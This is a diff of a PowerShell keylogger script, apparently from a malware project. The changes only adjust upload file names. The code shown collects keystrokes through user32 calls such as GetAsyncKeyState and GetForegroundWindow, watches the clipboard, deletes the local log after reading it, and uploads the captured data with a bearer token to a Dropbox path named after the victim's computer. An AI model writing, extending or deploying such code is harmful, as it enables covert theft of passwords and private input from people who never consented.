@@ -39,7 +39,7 @@ Function PostBinary {
        $headers = @{
          "Authorization" = "Bearer $accessToken"
          "Content-Type" = "application/octet-stream"
-         "Dropbox-API-Arg" = "{`"path`": `"/keylog/$env:COMPUTERNAME/$name`",`"mode`": `"add`"}"
+         "Dropbox-API-Arg" = "{`"path`": `"/keylog/$env:COMPUTERNAME/$name.txt`",`"mode`": `"add`"}"
         }
 
         # 파일 업로드 요청 보내기
@@ -88,7 +88,7 @@ Function PostBinary {
 			$logbytes = [System.IO.File]::ReadAllBytes($Path);
 			[System.IO.File]::Delete($Path);
 			$length = Decode-Binary ($logbytes) ($logbytes.Length)
-			PostBinary -bytes $logbytes -name "enc_key.txt";
+			PostBinary -bytes $logbytes -name "enc_key";
 	}
 	$al = @('[DllImport("user32.dll",CharSet=CharSet.Auto)]', 'public static extern', 'System.Text.StringBuilder');
 	$f = @("GetAsyncKeyState", "GetKeyboardState", "MapVirtualKey", "GetForegroundWindow", "GetWindowText", "ToUnicode", "GetClipboardSequenceNumber", "IsClipboardFormatAvailable", "GetTickCount");
